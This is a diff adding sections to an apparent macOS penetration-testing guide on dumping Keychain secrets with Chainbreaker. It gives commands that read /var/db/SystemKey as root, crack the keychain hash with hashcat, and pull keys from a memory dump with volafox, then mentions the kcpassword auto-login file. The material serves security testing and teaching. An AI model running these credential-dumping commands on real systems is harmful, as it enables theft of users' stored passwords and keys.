@@ -771,6 +771,47 @@ Given the keychain unlock password, a master key obtained using [volafox](https:
 
 Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.
 
+#### Dump keychain keys
+
+```bash
+#Dump all keys of the keychain (without the passwords)
+python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
+```
+
+#### Dump keychain keys \(with passwords\) with SystemKey
+
+```bash
+# First, get the keychain decryption key
+## To get this decryption key you need to be root and SIP must be disabled
+hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
+### Use the previous key to decrypt the passwords
+python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
+```
+
+#### Dump keychain keys \(with passwords\) cracking the hash
+
+```bash
+# Get the keychain hash
+python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
+# Crack it with hashcat
+hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
+# Use the key to decrypt the passwords
+python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
+```
+
+#### Dump keychain keys \(with passwords\) with memory dump
+
+[Follow these steps](./#dumping-memory-with-osxpmem) to perform a **memory dump**
+
+```bash
+#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
+## Unformtunately volafox isn't working with the latest versions of MacOS
+python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
+
+#Try to extract the passwords using the extracted keychain passwords
+python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
+```
+
 ### kcpassword
 
 The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password \(which isn't very secure\).
